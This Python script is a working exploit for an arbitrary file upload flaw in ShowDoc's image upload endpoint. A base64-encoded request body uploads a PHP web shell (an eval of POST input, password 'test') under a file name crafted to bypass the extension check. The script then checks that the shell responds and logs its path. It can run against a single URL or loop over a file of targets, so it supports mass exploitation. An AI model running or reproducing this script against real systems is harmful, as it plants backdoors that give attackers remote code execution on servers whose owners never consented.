import base64
import json
import re

import requests
import argparse
import urllib3
import sys

from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Content-Type':'multipart/form-data; boundary=--------------------------921378126371623762173617d',
    'Contention':'close',
    'Content-Disposition':'form-data; name="editormd-image-file"; filename="test.<>php"',
    'Content-Type': 'text/plain'
}

proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

def title():
    print("""
                              ShowDoc任意文件上传漏洞
                           use: python3 ShowDoc任意文件上传漏洞.py
                              Author: kento-sec
    """)

# proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/index.php?s=/home/page/uploadImg"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
        }
        data = base64.b64decode(
            "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if "success" in response.text and response.status_code == 200:
                webshell_url = re.findall(r'"url":"(.*?)"', response.text)[0]
                webshell_url = webshell_url.replace('\\', '')
                response = requests.get(url=webshell_url, headers=headers, verify=False, timeout=5)
                if "test_test" in response.text and response.status_code == 200:
                    print("\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \n[o] 路径为 {}\033[0m".format(self.url, webshell_url))
                    print("\033[32m[o] 密码为: test \033[0m")
                    with open("ShowDoc任意文件上传漏洞结果.txt", mode="a") as rp:
                        rp.write(self.url + " shell路径为：" + webshell_url + "\n")
                else:
                    print("\033[31m[x] 请求失败 \033[0m")
                    sys.exit(0)
            else:
                print("\033[31m[x] 上传失败 \033[0m")
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="ShowDoc任意文件上传漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 ShowDoc任意文件上传漏洞.py -u http://127.0.0.1\neg2:>>>python3 ShowDoc任意文件上传漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
